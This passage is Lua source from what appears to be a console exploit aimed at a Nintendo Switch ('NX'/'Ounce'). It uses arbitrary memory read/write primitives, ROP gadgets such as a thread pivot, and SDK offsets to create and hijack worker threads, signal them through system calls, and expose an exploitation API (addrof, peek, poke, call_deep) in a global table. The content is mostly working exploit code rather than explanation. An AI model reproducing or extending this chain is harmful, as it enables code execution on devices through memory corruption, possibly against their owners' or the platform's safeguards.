			desc_end = w(i, L.worker_desc_off) + L.worker_desc_size
		}
		local run_builder = builder or build_worker_loop
		run_builder(i, area, w, L)
	end

	local function spawn(i, w, L)
		w = w or worker
		L = L or layout
		local tt = w(i, L.worker_tt_off)
		run_chain(function(E)
			E:call3(sdk_base + offsets_sdk.thread_impl_create, 0, tt,
				main_base + gadgets.g_thread_pivot)
			E:call3(sdk_base + offsets_sdk.thread_impl_start, 0, tt, 0)
		end)
		-- the handle is a u32 at +0x1b8; tag the cell above it before the read
		w64(tt + L.worker_handle_off + 8, 3)
		local raw = r64(tt + L.worker_handle_off)
		if raw then
			return raw % 0x100000000
		end
		return nil
	end

	local function send_job(i, seq, fn, x0, x1)
		local job = worker(i, layout.job)
		w64(job + 0x38, x1)
		w64(job + 0x40, seq)
		w64(job + 0x48, fn)
		w64(job + 0x50, x0)
		w64(worker(i, layout.mailbox_ack), MAILBOX_ARMED)
		w64(worker(i, layout.mailbox_cmd), MAILBOX_GO)
		run_chain(function(E)
			-- svcSignalToAddress(&worker->mailbox_cmd, SignalType_Signal, value=0, numToSignal=?)
			E:call3(sdk_base + offsets_sdk.svc_signal_to_address,
				worker(i, layout.mailbox_cmd), 0, 0)
			-- loop till ack
			E:wait_eq1(worker(i, layout.mailbox_ack))
		end)
	end

	local function stop_worker(i)
		local job = worker(i, layout.job)
		w64(job + 0x38, 0)
		w64(job + 0x40, 0)
		w64(job + 0x48, sdk_base + offsets_sdk.svc_exit_thread)
		w64(job + 0x50, 0)
		w64(worker(i, layout.mailbox_cmd), MAILBOX_GO)
		run_chain(function(E)
			-- svcSignalToAddress(&worker->mailbox_cmd, SignalType_Signal, value=0, numToSignal=?)
			E:call3(sdk_base + offsets_sdk.svc_signal_to_address,
				worker(i, layout.mailbox_cmd), 0, 0)
		end)
	end

	local function join(i, handle)
		local tt = worker(i, layout.worker_tt_off)
		run_chain(function(E)
			-- svcWaitSynchronization(&out, &handle, numHandles=1, timeout=0)
			E:call3(sdk_base + offsets_sdk.svc_wait_sync,
				worker(i, layout.worker_wait_off),
				tt + layout.worker_handle_off, 1)
			-- svcCloseHandle(handle)
			E:call3(sdk_base + offsets_sdk.svc_close_handle, handle or 0, 0, 0)
		end)
	end

	local function poll(i)
		return destructive_read(worker(i, layout.worker_marker_off)),
			destructive_read(worker(i, layout.mailbox_status)),
			destructive_read(worker(i, layout.mailbox_ack))
	end

	_G.n2h = {
		platform = is_ounce and "Ounce" or "NX",
		main_base = main_base,
		sdk_base = sdk_base,
		gadgets = gadgets,
		offsets_main = offsets_main,
		offsets_sdk = offsets_sdk,
		layout = layout,
		addrof = addrof,
		sdk = function(name)
			local va = offsets_sdk[name]
			assert(va, "unknown offset " .. tostring(name))
			return sdk_base + va
		end,
		peek = destructive_read,
		poke = w64,
		str_addr = str_addr,
		write_bytes = wstr,
		alloc = alloc,
		free = free_block,
		call_deep = call_deep,
		run_chain = run_chain,
		new_emitter = new_emitter,
		worker = worker,
		worker_count = layout.worker_count,
		worker_text = layout.worker_text or layout.worker_string_off,
		block_raw = raw_block,
		prepare = prepare,
		spawn = spawn,
		post = send_job,
		poll = poll,
		stop = stop_worker,
		join = join,
		log = print,
	}
	collectgarbage("restart")
end

xpcall(setup, fatal)
